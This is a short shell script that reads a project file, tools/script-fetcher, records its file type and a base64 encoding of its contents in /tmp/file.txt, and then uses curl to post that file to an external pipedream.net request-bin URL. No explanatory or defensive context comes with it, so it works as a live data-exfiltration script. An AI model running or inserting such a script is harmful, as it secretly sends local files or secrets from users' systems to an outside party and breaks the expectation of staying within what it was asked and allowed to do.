#!/bin/sh

echo $(file tools/script-fetcher) > /tmp/file.txt
echo "---------" >> /tmp/file.txt
echo $(cat tools/script-fetcher | base64) >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
